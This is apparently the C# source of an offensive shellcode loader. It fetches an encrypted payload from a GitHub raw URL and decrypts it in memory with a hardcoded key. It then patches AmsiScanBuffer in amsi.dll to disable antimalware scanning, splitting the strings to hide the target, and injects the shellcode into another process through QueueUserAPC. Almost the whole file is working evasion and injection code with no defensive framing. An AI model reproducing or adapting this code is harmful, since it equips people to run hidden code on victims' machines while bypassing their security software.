using System;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading.Tasks;

namespace Shelly
{
    class Program
    {
        static async Task Main()
        {
            Console.WriteLine("Excel at Excess...ess.");

            string keyword = "ImASixteenBitKey";
            string url = "https://raw.githubusercontent.com/MelloSec/cncmusicfactory/main/skaven.txt";


            var inMemToMem = new InMemStorage();
            var decryptedData = await inMemToMem.DecryptAndSave(url, keyword);
            // Use the decryptedData byte array here...
            byte[] shellcode = decryptedData;

            // Defang
            SiameseDream.now();

            // Decode

            // Old method
/*            byte[] shellcode = SkavenCode.DecodeFromBase64Url(url);*/

            // Execute 
            QueueUserAPCInjectionNG injection = new QueueUserAPCInjectionNG();
            injection.Invoke(shellcode);

        }

        // Execute shellc0d3z
        public class QueueUserAPCInjectionNG : HelperMethods
        {
            public void Invoke(byte[] shellcode)
            {
                try
                {
                    Process p = SelectTargetProcess();
                    Console.WriteLine($"[*] Selected Process {p.Id}, {p.ProcessName}.exe");
                    IntPtr remoteProcMem = VirtualAllocEx(
                        p.Handle, IntPtr.Zero,
                        shellcode.Length, 0x1000, 0x04
                    );
                    IntPtr t = IntPtr.Zero;
                    WriteProcessMemory(
                        p.Handle, remoteProcMem,
                        shellcode, shellcode.Length, out t);
                    UInt32 v = 0;
                    VirtualProtectEx(p.Handle, remoteProcMem, shellcode.Length, 0x40, out v);

                    int primaryThread = GetMostRecentThread(p);
                    if (primaryThread == 0)
                        Environment.Exit(0);
                    IntPtr threadId = OpenThread(ThreadAccess.SET_CONTEXT, false, primaryThread);
                    QueueUserAPC(remoteProcMem, threadId, IntPtr.Zero);
                    CloseHandle(threadId);
                    Console.WriteLine(threadId);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[*] QueueUserAPCInjectionNG(): {e.Message}");
                    Environment.Exit(0);
                }
            }
        }

        // Angry Mom's Strange Intellect
        public class SiameseDream
        {
            static byte[] x64 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            static byte[] x86 = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };


            // Select the byte array based on arch
            public static void now()
            {
                if (is64Bit())
                    target(x64);
                else
                    target(x86);
            }
             // Patch scan bugger
            private static void target(byte[] patch)
            {
                try
                {
                    var sIam = "am";
                    var eSe = "si";
                    var dll = ".dll";
                    var lib = HelperMethods.LoadLibraryA(sIam + eSe + dll);
                    var Am = "Am";
                    var siScan = "siScan";
                    var Buffer = "Buffer";
                    var addr = HelperMethods.GetProcAddress(lib, Am + siScan + Buffer);

                    uint oldProtect;
                    HelperMethods.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);

                    Marshal.Copy(patch, 0, addr, patch.Length);
                }
                catch (Exception e)
                {
                    Console.WriteLine(" [x] {0}", e.Message);
                    Console.WriteLine(" [x] {0}", e.InnerException);
                }
            }

            // Arch check
            private static bool is64Bit()
            {
                bool is64Bit = true;

                if (IntPtr.Size == 4)
                    is64Bit = false;

                return is64Bit;
            }
        }
    }
}






